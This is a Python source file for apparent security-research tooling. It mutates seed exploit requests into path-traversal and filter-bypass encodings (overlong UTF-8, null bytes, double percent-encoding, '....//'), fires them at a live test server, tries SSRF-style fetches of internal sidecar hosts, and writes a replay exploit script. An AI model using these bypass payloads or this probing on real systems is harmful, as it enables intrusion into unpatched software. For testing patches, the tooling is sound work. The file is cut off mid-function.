#!/usr/bin/env python3
"""PCG core — the paper's method as an executable pipeline (v2, paper-complete).

Stages (paper §5.6): EXTRACT → BUILD → EXECUTE → VALIDATE.
  EXTRACT  P  fold the seed PoC (concrete request, dangerous spans, assertion
              literals)                       [pcg_core]
           O  changed predicates, symmetric, tree-sitter   [pcg_graph]
           D  call graph / dispatch points, tree-sitter + frozen CodeQL
              queries (10-minute database budget)          [pcg_graph]
  BUILD    the Patch-Closure Graph: language + coverage overlays, four edge
           types, provenance tags (tool-derived | model-proposed |
           hypothesized), machine-checked accounting       [pcg_graph]
  EXECUTE  per matched pattern (paper §5.3–§5.5):
           B encoding    registered families (frozen table + manifest hash)
                         + source-derived sentinels + slot migration +
                         guard follower + model-proposed tier
           A coverage    sibling admission (four machine-checked conditions),
                         preregistered ranking, credential replay, K=8
                         siblings / ≤10 references
           C tails       resource exhaustion (length ladder + benign control
                         + watchdog) and timing/re-resolution (concurrency
                         + no-concurrency control, replayed)
  VALIDATE every surviving candidate on live V1; a chain is solved only when
           the marker appears AND the witness names the changed predicate it
           bypasses; a marker without a predicate is effect-only (counted
           separately). No session state in the replay artifact.

Budgets are preregistered (paper §5.6): N=4 probes, 30-second timeout,
K=8 siblings, at most ten references per chain. `--probes` above N is an
extended budget recorded as budget_mode=extended in the ledger.

The model role appears where the paper puts it: proposing semantic edges,
sibling carriers and encoding variants — each accepted only through the
machine-checked conditions or a single live attempt, and always tagged
model-proposed. Proposal files (all optional):
  work/model_edges.json     [{"type","src","dst"}]      semantic edges
  work/model_siblings.json  ["<route>", ...]            sibling carriers
  work/model_variants.json  [{"slot","value"}]          encoding variants

Usage: pcg_core.py <package_dir> [--strategy auto|A|B|C-tail|C-time]
                   [--probes N] [--skip-codeql]
"""
from __future__ import annotations

import argparse
import concurrent.futures
import difflib
import hashlib
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import pcg_graph  # noqa: E402

FLAG_RE = re.compile(r"PCBFLAG_[0-9a-fA-F]{16,64}")
BUDGET_PROBE_S = 30
K_SIBLINGS = 8
N_PROBES = 4
MAX_REFERENCES = 10
CUE_RESOURCE_RE = re.compile(
    r"(?i)(threshold|rate.?limit|brute|lockout|attempt|quota|\bdos\b|backoff|"
    r"exhaust|health|timeout.?budget)")
CUE_TIMING_RE = re.compile(
    r"(?i)(\brace\b|concurren|rebind|re-?resolv|cache residue|\bdns\b|"
    r"follow(ed|ing)? redirect)")


# ═══════════════════════════════════════════════════════════════════════
# EXTRACT — P: fold the seed into a concrete request candidate
# ═══════════════════════════════════════════════════════════════════════

def load_seed_candidate(poc_path: str):
    """Exec the seed module and call its candidate() (declarative seeds).

    Returns (candidate_dict, label_mode). Label-mode seeds take the canary
    label as an argument (redirect-label cases); the label is taken from the
    environment, which the harness provides per deployment. Imports the seed
    cannot satisfy offline (oracle helpers) are stubbed — candidate() itself
    is declarative and never calls them.
    """
    import importlib.abc
    import importlib.util
    import inspect
    import types
    import unittest.mock as _mock

    with open(poc_path, errors="replace") as f:
        src = f.read()

    saved_argv0 = sys.argv
    sys.argv = [poc_path]  # seeds may parse argv at import time

    def _exec() -> dict:
        # a non-main __name__ keeps the seed's self-test block from running
        # (the harness sanitize strips it; smoke/exec contexts here match)
        ns: dict = {"__name__": "pcg_seed", "__file__": poc_path}
        exec(compile(src, poc_path, "exec"), ns)
        return ns

    try:
        ns = _exec()
    except Exception:
        # the fold is sandboxed: any module-level failure (missing helper
        # modules, executable-style seeds needing a live deployment) degrades
        # to an honest non-declarative status — never a crash
        return None, False
        class _StubLoader(importlib.abc.Loader):
            def create_module(self, spec):
                return _mock.MagicMock()

            def exec_module(self, module):
                pass

        class _StubFinder(importlib.abc.MetaPathFinder):
            def find_spec(self, name, path=None, target=None):
                return importlib.util.spec_from_loader(name, _StubLoader())

        sys.meta_path.insert(0, _StubFinder())
        try:
            ns = _exec()
        finally:
            sys.meta_path.pop(0)
    fn = ns.get("candidate")
    if fn is None:
        return None, False
    try:
        label = _label_from_env()
        try:
            params = list(inspect.signature(fn).parameters)
        except (TypeError, ValueError):
            params = []
        if params:
            label = _label_from_env() or "PCBFLAG_" + "0" * 32  # dry-run placeholder
            try:
                return fn(label), True
            except TypeError:
                pass
            try:
                return fn(), False
            except TypeError:
                return fn(_label_from_env() or "PCBFLAG_" + "0" * 32), True
            except Exception:
                return None, False  # candidate needs a live deployment
        try:
            return fn(), False
        except TypeError:
            return fn(_label_from_env() or "PCBFLAG_" + "0" * 32), True
        except Exception:
            # candidate() needs a live deployment (executable-style seed):
            # honest status, no crash (paper: the fold is sandboxed)
            return None, False
    finally:
        sys.argv = saved_argv0


def _label_from_env() -> str:
    for name in ("PCB_FLAG", "RUN_FLAG", "MARKER", "FLAG", "CANARY"):
        v = os.environ.get(name, "").strip()
        if v:
            return v
    for v in os.environ.values():
        if FLAG_RE.fullmatch(v.strip()):
            return v.strip()
    return ""


def flatten_candidate(cand: dict):
    """Flatten one level of nested candidate dicts (query/body/form) so the
    request slots are addressable and fire() transmits them. `endpoint`-style
    path aliases fold into `path`."""
    flat = {}
    for k, v in cand.items():
        if isinstance(v, dict):
            for sk, sv in v.items():
                flat[sk if sk not in cand else f"{k}_{sk}"] = sv
        else:
            flat[k] = v
    if "path" not in flat:
        for alias in ("endpoint", "route", "uri", "url"):
            if isinstance(flat.get(alias), str) and flat[alias].startswith("/"):
                flat["path"] = flat[alias]
                break
    return flat


def dangerous_spans(cand: dict):
    """P: the seed's own dangerous spans — %-escapes first (the author marked
    the critical part), then traversal forms, then literal dots/backslashes
    and slashes."""
    spans = []
    for key, v in cand.items():
        if not isinstance(v, str) or key in ("method", "probe_id"):
            continue
        if "../" in v and "../" not in spans:
            spans.append("../")
        if ".." in v and ".." not in spans:
            spans.append("..")
        for m in re.finditer(r"%u[0-9a-fA-F]{4}|%[0-9a-fA-f]{2}|[./\\]{1,4}", v):
            s = m.group(0)
            if s not in spans:
                spans.append(s)
    return spans[:12]


def assertion_literals(cand: dict):
    """P: the seed's assertion literals — canary-shaped tokens and literal
    strings the folded request carries."""
    outs = []
    for key, v in cand.items():
        if isinstance(v, str) and key not in ("method", "probe_id"):
            outs.append((key, v))
    return outs


def _regex_predicates(diff_path: str):
    """Fallback Extractor O (regex engine) when tree-sitter cannot parse the
    diff's languages. Same symmetric walk, coarser predicates."""
    with open(diff_path, errors="replace") as f:
        text = f.read()
    added, removed = [], []
    for line in text.splitlines():
        if line.startswith("+") and not line.startswith("+++"):
            added.append(line[1:])
        elif line.startswith("-") and not line.startswith("---"):
            removed.append(line[1:])
    lit = re.compile(r"""["'`]([^"'`\n]{2,80})["'`]""")
    consts = []
    for l in added + removed:
        for m in lit.finditer(l):
            v = m.group(1)
            if re.search(r"[./\\%]", v) or len(v) >= 3:
                consts.append(v)
    cond = re.compile(r"\b(if|elif|while|switch|case)\b|[!=]=|includes?|contains?|"
                      r"startsWith|endsWith|\.test\(|matches?|preg_match|in_array")
    cond_cfg = re.compile(r"<filesmatch|<files\s|<directory|<location|"
                          r"rewriterule|rewritecond|require\s+(?:all|valid)|"
                          r"\bdeny\b|\ballow\b", re.I)
    preds = [{"file": "?", "side": "added", "text": l.strip()[:200]}
             for l in added if cond.search(l) or cond_cfg.search(l)]
    return {"engine": "regex-fallback",
            "predicates": preds[:16],
            "literals": sorted({c for c in consts
                                if re.search(r"[./\\%:]", c) and 2 <= len(c) <= 64})[:24],
            "guards": []}


# ═══════════════════════════════════════════════════════════════════════
# BUILD — the frozen registered encoding-family table (paper §5.4)
# ═══════════════════════════════════════════════════════════════════════

def _percent_all(s: str) -> str:
    return "".join("%%%02X" % b for b in s.encode())


def _percent_single_token(s: str) -> str:
    for i, ch in enumerate(s):
        if i == 0 and ch == "/":
            continue  # the leading path anchor is routing — encoding it
            # makes the request line unfireable (origin-form must start /)
        if ch in "./\\":
            return s[:i] + ("%%%02X" % ord(ch)) + s[i + 1:]
    return s


def _percent_double_token(s: str) -> str:
    for i, ch in enumerate(s):
        if i == 0 and ch == "/":
            continue  # leading path anchor stays literal (see _percent_single_token)
        if ch in "./\\":
            enc = "".join("%%%02X" % b for b in ("%%%02X" % ord(ch)).encode())
            return s[:i] + enc + s[i + 1:]
    return s


def _percent_u(s: str) -> str:
    out = []
    for ch in s:
        if ch in "./\\":
            out.append("%%u%04x" % ord(ch))
        else:
            out.append(ch)
    return "".join(out)


def _case_fold(s: str) -> str:
    return re.sub(r"%[0-9a-f]{2}", lambda m: m.group(0).upper(), s)


def _dot_inner(s: str) -> str:
    return s.replace("..", "....//") if ".." in s else s.replace(".", "....//", 1)


def _dot_slash_prefix(s: str) -> str:
    return "/." + s if s.startswith("/") else s


def _slash_dot_swap(s: str) -> str:
    return s.replace("/", "\\")


def _overlong(s: str) -> str:
    return s.replace(".", "%c0%ae").replace("/", "%c0%af")


def _null_suffix(s: str) -> str:
    for i, ch in enumerate(s):
        if ch in "./\\":
            return s[:i + 1] + "%00" + s[i + 1:]
    return s + "%00"


def _entity(s: str) -> str:
    return s.replace(".", "&#46;").replace("/", "&#47;")


def _fullwidth(s: str) -> str:
    return s.replace(".", "\uff0e").replace("/", "\uff0f")


def _tab_nl(s: str) -> str:
    return s.replace("/", "/%09/").replace(".", "%0a.", 1)


def _userinfo(s: str) -> str:
    m = re.match(r"^(https?:)//([^/@]+@)?([^/]*)(/.*)?$", s)
    if m and not m.group(2):
        return f"{m.group(1)}//x@{m.group(3)}{m.group(4) or ''}"
    return s


def _leading_ctrl(s: str) -> str:
    return "\x08" + s


def _leading_ctrl_enc(s: str) -> str:
    return "%08" + s


def _second_byte(s: str) -> str:
    """Mutate the second byte of a two-byte lead (e.g. /\\ -> /.)."""
    if len(s) >= 2:
        return s[0] + "." + s[2:]
    return s


def _percent_reencode(s: str) -> str:
    """Re-encode every existing %-escape (defeats consumers that decode
    twice: one pass exposes the escape, the second realizes it — the
    double-decode incomplete-fix pattern)."""
    if "%" not in s:
        return s
    return s.replace("%", "%25")


def _percent_split(s: str) -> str:
    """Split-escape form: keep each leading percent literal and re-encode the
    escape's payload bytes individually (%2e -> %%32%65, every token). This is
    the shape double-decoding consumers realize (an ap_escape/unescape
    round-trip re-encodes the payload but not the stray percent). Empirically
    the ALL-tokens form is what defeats the double decode — a mixed
    first-token-only form still normalizes away (PCBV2-0002: 200 vs 400)."""
    if "%" not in s:
        return s
    return re.sub(r"%u[0-9a-fA-F]{4}|%[0-9a-fA-F]{2}",
                  lambda m: "%" + "".join("%%%02X" % ord(c) for c in m.group(0)[1:]),
                  s)


REGISTERED_FAMILIES = [
    ("percent-single", _percent_single_token),
    ("percent-double", _percent_double_token),
    ("percent-reencode", _percent_reencode),
    ("percent-split", _percent_split),
    ("percent-u", _percent_u),
    ("case-fold", _case_fold),
    ("dot-inner", _dot_inner),
    ("dot-slash-prefix", _dot_slash_prefix),
    ("slash-dot-swap", _slash_dot_swap),
    ("overlong-utf8", _overlong),
    ("null-suffix", _null_suffix),
    ("html-entity", _entity),
    ("second-byte", _second_byte),
    ("tab-newline", _tab_nl),
    ("userinfo", _userinfo),
    ("leading-control", _leading_ctrl),
    ("leading-control-enc", _leading_ctrl_enc),
]

FAMILIES_MANIFEST = hashlib.sha256(
    "\n".join(n for n, _ in REGISTERED_FAMILIES).encode()).hexdigest()[:16]

PCT_TOKEN = re.compile(r"%u[0-9a-fA-F]{4}|%[0-9a-fA-f]{2}")
DOT_TOKEN = re.compile(r"[.\\]")
SLASH_TOKEN = re.compile(r"/")


def _critical_span(s: str):
    """First critical span on the ORIGINAL string, smallest priority class
    first: the seed's %-escapes, then dots/backslashes (skipping a leading
    path anchor), then non-leading slashes. Returns (start, end, tok)."""
    m = PCT_TOKEN.search(s)
    if m:
        return m.start(), m.end(), m.group(0)
    m = re.compile(r"(?<!\A)[.\\]").search(s)
    if m:
        return m.start(), m.end(), m.group(0)
    m = re.compile(r"(?<!\A)/").search(s)
    if m:
        return m.start(), m.end(), m.group(0)
    m = SLASH_TOKEN.search(s)
    return (m.start(), m.end(), m.group(0)) if m else None


def _token_char(tok: str) -> str:
    if tok.startswith("%u"):
        return chr(int(tok[2:], 16))
    if tok.startswith("%"):
        return chr(int(tok[1:], 16))
    return tok


def minimal_variant(s: str, family: str):
    """Apply the family to the FIRST critical span only (minimal perturbation,
    paper §5.4). Returns None when the family does not apply."""
    span = _critical_span(s)
    if not span:
        return None
    start, end, tok = span
    ch = _token_char(tok)
    enc = None
    if family == "percent-u":
        enc = "%%u%04x" % ord(ch) if ch in "./\\" else None
    elif family == "overlong-utf8":
        enc = {".": "%c0%ae", "/": "%c0%af", "\\": "%c0%af"}.get(ch)
    elif family == "percent-single":
        enc = "%%%02X" % ord(ch) if tok[0] != "%" else None
    elif family == "percent-double":
        enc = ("".join("%%%02X" % b for b in ("%%%02X" % ord(ch)).encode())
               if tok[0] not in "%" else None)
    elif family == "percent-reencode":
        enc = "%25" + tok[1:] if tok[0] == "%" else None
    elif family == "percent-split":
        enc = "%" + "".join("%%%02X" % ord(c) for c in tok[1:]) if tok[0] == "%" else None
    elif family == "null-suffix":
        enc = tok + "%00"
    elif family == "entity":
        enc = {".": "&#46;", "/": "&#47;", "\\": "&#92;"}.get(ch)
    elif family == "case-fold":
        enc = tok.upper() if re.fullmatch(r"%[0-9a-f]{2}", tok) else None
    if not enc or enc == tok:
        return None
    return s[:start] + enc + s[end:]


def sentinel_variants(sentinel: str):
    """Source-derived sentinels: encode a guard comparison constant the ways
    consumers decode (paper §5.4 tier 2)."""
    outs = []
    if sentinel and sentinel[0] in "./\\":
        outs.append(_percent_all(sentinel))
        outs.append(_percent_u(sentinel))
        outs.append(_overlong(sentinel))
        outs.append(_percent_single_token(sentinel))
    return [(f"sentinel:{sentinel}", v) for v in outs if v != sentinel]


# ═══════════════════════════════════════════════════════════════════════
# EXECUTE — candidate construction
# ═══════════════════════════════════════════════════════════════════════

def mutatable_targets(cand: dict):
    """Slots of the seed candidate that carry the dangerous span."""
    out = []
    for key in ("path", "url", "to", "redirect_to", "redirect", "next", "u",
                "urlparam", "file", "filename", "name", "target", "dest",
                "returnTo", "return_to", "continue", "callback", "endpoint",
                "route", "id", "file_path", "filepath", "p"):
        v = cand.get(key)
        if isinstance(v, str) and len(v) >= 2:
            out.append(key)
    if not out:  # fall back to any string slot with critical characters
        for key, v in cand.items():
            if isinstance(v, str) and key not in ("method", "probe_id") \
                    and re.search(r"[./\\%]", v):
                out.append(key)
    return out


def build_probe_plan(cand: dict, sentinels, guard_variants=None, extra=None):
    """Strategy B candidate list (paper §5.4, algo_preimage): registered
    families (minimal perturbation first, whole-string last), source-derived
    sentinels, guard-follower variants (strict polarity preconditioned,
    applied in-place to the slot value), slot-migration over the fixed
    component order, then model-proposed variants. Ranked by edit distance."""
    plan = []
    for slot in mutatable_targets(cand):
        base = str(cand[slot])

        def add(family, value, origin):
            if value and value != base:
                plan.append({"slot": slot, "family": family, "value": value,
                             "origin": origin, "dist": difflib.SequenceMatcher(
                                 None, base, value).ratio()})

        # tier 1: registered families, minimal perturbation then whole-string
        for fam, fn in REGISTERED_FAMILIES:
            add(fam, minimal_variant(base, fam), "registered")
            try:
                add(fam, fn(base), "registered")
            except Exception:
                pass
        # tier 2: source-derived sentinels
        for sent in sentinels:
            for tag, mutated in sentinel_variants(sent):
                add(tag, mutated, "sentinel")
        # bounded operator: guard follower — the span variant substitutes
        # into the slot value in place; for traversal spans also the
        # repeated form (unit × seed depth + tail), which is what defeats
        # single-pass normalizers (FUXA: "....//" * depth)
        for span, gvs in (guard_variants or {}).items():
            if span not in base:
                continue
            for i, gv in enumerate(gvs):
                add(f"guard-follower:{span}#{i}", base.replace(span, gv, 1),
                    "guard-follower")
            depth = base.count(span)
            tail = base[base.rfind(span) + len(span):]
            if depth > 1:
                for i, gv in enumerate(gvs[:2]):
                    for k in (depth, depth - 1):
                        if k >= 1:
                            add(f"guard-follower-repeat:{span}#{i}x{k}",
                                gv * k + tail, "guard-follower")
        # guard follower on Clean-type guards: normalizable prefix + base
        for i, gv in enumerate((guard_variants or {}).get("__prefix__", [])):
            add(f"guard-follower:clean#{i}", gv + base, "guard-follower")
        # bounded operator: slot migration (fixed RFC 3986 order)
        for comp, mv in pcg_graph.slot_migration(base):
            add(f"slot-migration:{comp}", mv, "slot-migration")
    for p in (extra or []):
        plan.append({**p, "dist": difflib.SequenceMatcher(
            None, str(cand.get(p.get("slot", "path")), p.get("value", ""))).ratio()})
    fam_order = {n: i for i, (n, _) in enumerate(REGISTERED_FAMILIES)}
    # guard-follower candidates are constructed from the guard's own
    # normalization knowledge, not blind encodings — they lead the plan;
    # registered/sentinel/model tiers follow in edit-distance order
    plan.sort(key=lambda p: (p["origin"] != "guard-follower",
                             -p["dist"], fam_order.get(p["family"], 99)))
    seen, uniq = set(), []
    for p in plan:
        k = (p["slot"], p["value"])
        if k not in seen:
            seen.add(k)
            uniq.append(p)
    return uniq


def _sidecar_service(pkg: str):
    """Sidecar service name from plant facts (work/plant_facts.md) — scoped
    to the sidecar section only (the app-variants section also says
    `service ...` but is not a fetch target)."""
    try:
        t = open(os.path.join(pkg, "work", "plant_facts.md"), errors="replace").read()
    except OSError:
        return None
    m = re.search(r"## Sidecar services carrying the marker.*?(?=\n## |\Z)", t, re.S)
    if not m:
        return None
    m = re.search(r"service `([\w-]+)`", m.group(0))
    return m.group(1) if m else None


def run_sidecast(cand, O, sentinels, graph_manifest, pkg, ledger, t0, host,
                 port, probes):
    """Strategy D — sidecar fetch (blind channels). The planted value lands
    only in an internal sidecar's hit log (unreachable externally), so the
    candidate cannot self-confirm: fire the seed's fetch slot aimed at the
    sidecar host through the registered-family transforms (the V1 guard
    blocks the plain host form; the residual is a parser-confusing form),
    emit the artifact, and let the instrumented scoring harvest decide
    (SCORING.md 5.2). Bounded to 8 live fires."""
    svc = _sidecar_service(pkg)
    if not svc:
        return None
    fired = 0
    best = None
    for slot in mutatable_targets(cand):
        base = str(cand[slot])
        path = urllib.parse.urlparse(base).path.lstrip("/") if base.startswith("http") \
            else base.lstrip("/")
        form = f"http://{svc}/{path}" if path else f"http://{svc}/"
        variants = {form}
        for fam, fn in REGISTERED_FAMILIES:
            if fired + len(variants) > 8:
                break
            try:
                v = fn(form)
            except Exception:
                v = None
            if v and v != form:
                variants.add(v)
        for v in sorted(variants):
            if fired >= 8:
                break
            if not re.match(r"^https?://[\w.:%-]+", v):
                continue  # a family broke the scheme/host — unfireable
            text = fire(cand, slot, v, host, port)
            fired += 1
            best = {"slot": slot, "value": v,
                    "family": f"sidecast:{svc}", "origin": "sidecast"}
            ledger["provenance"].append({"family": best["family"], "origin": "sidecast",
                                         "slot": slot, "value": v[:120], "hit": None,
                                         "note": "blind channel — scoring harvest decides"})
    if not best:
        ledger["probes_fired_sidecast"] = fired
        return None
    win = {"slot": best["slot"], "value": best["value"],
           "family": f"sidecast:{svc}", "origin": "sidecast"}
    predicate = _emit_artifact(pkg, cand, win, O, sentinels, graph_manifest, False)
    ledger["probes_fired"] = ledger.get("probes_fired", 0) + fired
    ledger["elapsed_s"] = round(time.time() - t0, 1)
    ledger["bypassed_predicate"] = (predicate or {}).get("text")
    return {"status": "SIDECAST", "strategy": "D", "family": win["family"],
            "origin": "sidecast", "predicate_named": bool(predicate),
            "ledger": ledger}


def _match_hit(text: str, label_mode: bool):
    """Echo-proof hit rule. Non-label mode: a server-planted token (any
    PCBFLAG match counts — nothing label-shaped was sent). Label mode: the
    label we embedded must surface in an EFFECT channel (a Location header),
    not merely be echoed in an error page."""
    if not label_mode:
        return FLAG_RE.search(text)
    loc = re.search(r"(?im)^location:\s*(\S+)", text)
    if loc and FLAG_RE.search(loc.group(1)):
        return FLAG_RE.search(loc.group(1))
    return None


def fire(cand: dict, slot: str, value: str, host: str, port: int):
    """Send the seed's request with one slot replaced. Returns response text
    (status + headers + body) for flag matching. The 30x hop is kept: for
    redirect classes the Location header IS the effect channel."""
    method = str(cand.get("method", "GET")).upper()
    base = f"http://{host}:{port}"
    c2 = dict(cand)
    c2[slot] = value
    path = c2.get("path", "/")
    if path.startswith(("http://", "https://")):
        # sidecast form: an absolute URL living in a path-like slot rides as
        # ONE encoded segment (proxy-style route) — a raw scheme in the path
        # would produce a malformed request URL
        path = urllib.parse.quote(path, safe="")
    elif not path.startswith("/"):
        # an origin-form request line must start with "/" — a transform that
        # ate the leading anchor is unfireable as-is
        return "UNFIREABLE no-lead"
    params = {k: v for k, v in c2.items()
              if k not in ("method", "path", "probe_id") and isinstance(v, (str, int, bool))}
    if params:
        sep = "&" if "?" in path else "?"
        if slot == "path":
            params.pop(slot, None)
        path = path + sep + urllib.parse.urlencode(params)
    url = base + path
    body = c2.get("body")
    data = None
    if isinstance(body, dict):
        data = json.dumps(body).encode()
    req = urllib.request.Request(url, method=method, data=data)
    if data is not None:
        req.add_header("Content-Type", "application/json")

    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None

    opener = urllib.request.build_opener(_NoRedirect)
    try:
        with opener.open(req, timeout=BUDGET_PROBE_S) as r:
            hdr = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body = r.read(200000).decode("utf-8", "replace")
            return f"HTTP {r.status}\n{hdr}\n{body}"
    except urllib.error.HTTPError as e:
        hdr = "\n".join(f"{k}: {v}" for k, v in (e.headers or {}).items())
        body = e.read().decode("utf-8", "replace")
        return f"HTTP {e.code}\n{hdr}\n{body}"
    except Exception as ex:
        return f"ERROR {ex}"


def health_ok(host: str, port: int, path: str = "/", timeout_s: int = 12) -> bool:
    """Watchdog probe for the tail strategies (paper §5.5): the flag is
    withheld until health checks fail."""
    try:
        with urllib.request.urlopen(f"http://{host}:{port}{path}", timeout=timeout_s):
            return True
    except urllib.error.HTTPError:
        return True  # an HTTP answer, even 500, means the process responds
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════════════
# Strategy A — sibling admission and replay (paper §5.3, algo_carrier)
# ═══════════════════════════════════════════════════════════════════════

_DISPATCH_VERBS = re.compile(
    r"^(get|post|put|delete|patch|head|options|all|any|use|route|map|handle|"
    r"register|add|mount|match|addUrlRule|addRoute|on|server)$", re.I)


def admit_sibling(d: dict, fn_index: dict, budget_used: int):
    """Four machine-checked conditions (paper §5.3):
    (1) the literal sits in a dispatch position — an argument of dynamic
        lookup or a value position in a routing table;
    (2) a short name resolves to exactly one project symbol;
    (3) a one-to-many match is dropped;
    (4) the preregistered budget.
    Returns (admitted: bool, status: str, resolution)."""
    if budget_used >= K_SIBLINGS:
        return False, "budget", None
    dispatch_position = bool(d.get("route_like")) or bool(_DISPATCH_VERBS.match(d.get("call", "")))
    if not dispatch_position:
        return False, "not-dispatch-position", None
    handler = d.get("handler")
    if handler:
        hits = fn_index.get(handler, [])
        if len(hits) == 1:
            return True, "admitted", handler
        if len(hits) > 1:
            return False, "one-to-many", handler
        # no project definition: inline handler — routing table in the same
        # file (≥3 route-like literals) counts as a value position
        return False, "unresolved-handler", handler
    return False, "no-handler", None


def rank_siblings(admitted: list, seed_literals: list, sinks: set, call_edges: list,
                  patched_dirs: frozenset = frozenset()):
    """Preregistered order (paper §5.3): overlap with the seed's path literals
    descending, module proximity to the changed files (same top-level module
    first — the cheap deterministic stand-in for graph community structure),
    steps to the sink ascending, file and line as the tiebreak."""
    def key(d):
        lit = (d.get("literal") or "").lower()
        overlap = sum(1 for s in seed_literals if s and s.lower() in lit)
        fdir = os.path.dirname(d.get("file", ""))
        near = any(fdir == pd or fdir.startswith(pd + "/") or pd.startswith(fdir + "/")
                   for pd in patched_dirs)
        return (-overlap, 0 if near else 1,
                pcg_graph.steps_to_sink(call_edges, d.get("caller", ""), sinks),
                d.get("file", ""), d.get("line", 0))
    return sorted(admitted, key=key)


# ═══════════════════════════════════════════════════════════════════════
# VALIDATE + artifact emission + ledger
# ═══════════════════════════════════════════════════════════════════════

ARTIFACT = '''#!/usr/bin/env python3
"""Residual reproduction (PCG core, family: {family}, origin: {origin}).

Derivation chain: the patch's changed condition —
    {predicate}
— admits this input while the downstream consumer reinterprets it
(family {family}, {origin}; registered table manifest {manifest};
graph manifest {graph_manifest}). The token is parsed from the live
response at runtime; the replay carries no session state.
"""
from __future__ import annotations
import json, os, re, sys, urllib.error, urllib.parse, urllib.request

FLAG_RE = re.compile(r"PCBFLAG_[0-9a-fA-F]{{16,64}}")
CAND = {cand_repr}
SLOT = {slot!r}
VALUE = {value!r}
BENIGN = {benign!r}


def _resolve_label(v):
    for name in ("PCB_FLAG", "RUN_FLAG", "MARKER", "FLAG", "CANARY"):
        lab = os.environ.get(name, "").strip()
        if lab:
            return v.replace("__LABEL__", lab)
    return v


def main() -> int:
    port = os.environ.get("PCB_PORT") or json.load(open(os.path.join(
        os.path.dirname(os.path.abspath(__file__)), "env.json")))["port"]
    host = os.environ.get("PCB_HOST", "10.7.0.11")
    cand = dict(CAND)
    cand[SLOT] = _resolve_label(VALUE)
    cand = {{k: (_resolve_label(v) if isinstance(v, str) else v) for k, v in cand.items()}}
    method = str(cand.get("method", "GET")).upper()
    path = cand.get("path", "/")
    if path.startswith(("http://", "https://")):
        # sidecast form: an absolute URL in a path-like slot rides as ONE
        # encoded segment (proxy-style route) — a raw scheme in the path
        # would produce a malformed request URL
        path = urllib.parse.quote(path, safe="")
    params = {{k: v for k, v in cand.items()
              if k not in ("method", "path", "probe_id")
              and isinstance(v, (str, int, bool))}}
    if params:
        path = path + ("&" if "?" in path else "?") + urllib.parse.urlencode(params)
    url = f"http://{{host}}:{{port}}{{path}}"
    body = cand.get("body")
    data = json.dumps(body).encode() if isinstance(body, dict) else None
    req = urllib.request.Request(url, method=method, data=data)
    if data is not None:
        req.add_header("Content-Type", "application/json")
    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None
    opener = urllib.request.build_opener(_NoRedirect)
    try:
        with opener.open(req, timeout=30) as r:
            text = f"HTTP {{r.status}}\\n" + "\\n".join(
                f"{{k}}: {{v}}" for k, v in r.headers.items()) + "\\n" + r.read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        text = f"HTTP {{e.code}}\\n" + "\\n".join(
            f"{{k}}: {{v}}" for k, v in (e.headers or {{}}).items()) + "\\n" + e.read().decode("utf-8", "replace")
    m = FLAG_RE.search(text)
    if not m:
        return 1
    print(f"FLAG: {{m.group(0)}}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


def wait_for_live(host: str, port: int, timeout_s: int = 90):
    """Cold-start guard: the solving instance may still be binding its port
    when the constructor starts. Poll harmlessly until it answers."""
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            req = urllib.request.Request(f"http://{host}:{port}/", method="GET")
            with urllib.request.urlopen(req, timeout=5):
                return True
        except urllib.error.HTTPError:
            return True  # any HTTP answer means the port is live
        except Exception:
            time.sleep(3)
    return False


def name_predicate(win, O, sentinels, base_value=""):
    """VALIDATE semantics (paper §5.6): the witness must NAME the changed
    predicate it bypasses. Guard-follower wins name the guard's own
    normalization line; otherwise the predicate line whose text the winning
    variant's tokens or the seed base's critical tokens appear in;
    None ⇒ effect-only."""
    if win.get("origin") == "guard-follower":
        for g in O.get("guards", []):
            for line in g.get("body", "").splitlines():
                if re.search(r"replace|RegExp|normaliz|Clean", line):
                    return {"file": g.get("file", ""), "text": line.strip()[:200]}
    val = str(win.get("value", ""))
    toks = {t for t in re.findall(r"[%A-Za-z0-9_.\\/-]{3,}", val)}
    if base_value:
        toks |= {t for t in re.findall(r"%u[0-9a-fA-F]{4}|%[0-9a-fA-f]{2}|[.\\/]{1,4}|[A-Za-z0-9_.-]{4,}", str(base_value))}
    famtok = win.get("family", "").split(":")[-1][:8]
    best, best_sc = None, 0
    for p in O.get("predicates", []):
        sc = sum(1 for t in toks if len(t) >= 3 and t in p["text"])
        sc += 1 if famtok and famtok in p["text"] else 0
        if sc > best_sc:
            best, best_sc = p, sc
    if best_sc == 0:
        for s in sentinels:
            if s and s[:12] in val:
                for p in O.get("predicates", []):
                    if s[:12] in p["text"]:
                        return p
    return best


def _emit_artifact(pkg, cand, win, O, sentinels, graph_manifest, label_mode,
                   benign=None, base_value=None):
    predicate = name_predicate(win, O, sentinels,
                               base_value if base_value is not None
                               else str(cand.get(win["slot"], "")))
    cand_repr = json.dumps(cand)
    value_t = win["value"]
    if label_mode:
        for lab in filter(None, {_label_from_env(), "PCBFLAG_" + "0" * 32}):
            cand_repr = cand_repr.replace(lab, "__LABEL__")
            value_t = value_t.replace(lab, "__LABEL__")
    art = ARTIFACT.format(
        family=win.get("family", "?"), origin=win.get("origin", "?"),
        predicate=(predicate["text"][:200] if predicate else "not named (effect-only)"),
        manifest=FAMILIES_MANIFEST, graph_manifest=graph_manifest,
        cand_repr=cand_repr[:4000], slot=win["slot"], value=value_t,
        benign=benign or "")
    with open(os.path.join(pkg, "residual_test.py"), "w") as f:
        f.write(art)
    return predicate


# ── strategy B: encoding residuals ───────────────────────────────────────

def run_encoding(cand, label_mode, O, sentinels, guard_variants, model_variants,
                 host, port, probes, ledger, t0, pkg, graph_manifest):
    plan = build_probe_plan(cand, sentinels, guard_variants, model_variants)
    if not plan:
        return {"status": "no-mutatable-slot", "ledger": ledger}
    fired = 0
    for p in plan:
        if fired >= probes:
            break
        text = fire(cand, p["slot"], p["value"], host, port)
        fired += 1
        m = _match_hit(text, label_mode)
        entry = {"family": p["family"], "origin": p["origin"],
                 "slot": p["slot"], "value": p["value"][:120],
                 "hit": bool(m),
                 "resp": text.splitlines()[0][:40] if text else ""}
        if p["origin"] == "guard-follower":
            entry["resp"] = text[:200]
        ledger["provenance"].append(entry)
        if m:
